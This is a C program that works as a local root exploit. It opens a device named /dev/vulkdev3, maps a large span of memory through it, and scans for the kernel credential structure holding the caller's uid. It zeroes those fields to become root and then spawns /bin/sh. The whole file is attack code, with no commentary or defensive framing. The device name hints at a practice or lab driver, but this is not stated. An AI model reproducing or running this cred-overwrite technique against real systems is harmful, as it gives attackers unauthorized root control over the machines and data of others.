#define _GNU_SOURCE 1
#include <unistd.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>

#define VULKDEV_DEVICE "/dev/vulkdev3"
#define KERNEL_ADDR 0xc0000000

int main(int argc, char* argv[])
{
	int fd;
	uid_t uid;
	size_t size;
	unsigned long addr;
	unsigned long start;
	off_t offset;

	uid = getuid();
	printf("uid = %d\n", uid);
	if (uid == 0) {
		printf("already root, exit\n");
		exit(0);
	}
	fd = open(VULKDEV_DEVICE, O_RDWR);
	if (fd < 0) {
		printf("open vulkdev fail!\n");
		exit(1);
	}

	size = 0x7ffe0000;
	start = 0x42424000;
	offset = 0x00000000;
	addr = (unsigned long)mmap((void *)start, size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, offset);
	if ((void *)addr == MAP_FAILED) {
		printf("mmap failed, errno = %d\n", errno);
		close(fd);
		return -1;
	}
	printf("mmap addr: %lx\n", (unsigned long)addr);

	unsigned int num = 0;
	unsigned long *p = (unsigned long *)addr;
	while ((unsigned long)p < addr + size - 0x40) {
		unsigned int idx = 0;
		if (p[idx++] == uid &&
			p[idx++] == uid &&
			p[idx++] == uid &&
			p[idx++] == uid &&
			p[idx++] == uid &&
			p[idx++] == uid &&
			p[idx++] == uid &&
			p[idx++] == uid) {
			printf("find cred structure, ptr=%p, num=%d\n", p, ++num);

			idx = 0;
			p[idx++] = 0;
			p[idx++] = 0;
			p[idx++] = 0;
			p[idx++] = 0;
			p[idx++] = 0;
			p[idx++] = 0;
			p[idx++] = 0;
			p[idx++] = 0;

			if (getuid() == 0) {
				break;
			} else {
				idx = 0;
				p[idx++] = uid;
				p[idx++] = uid;
				p[idx++] = uid;
				p[idx++] = uid;
				p[idx++] = uid;
				p[idx++] = uid;
				p[idx++] = uid;
				p[idx++] = uid;
			}
		}
		p++;
	}
	printf("loop end\n");

	if (getuid() == 0) {
		printf("GOT ROOT!\n");
		execl("/bin/sh", "sh", NULL);
	}
	return 0;
}
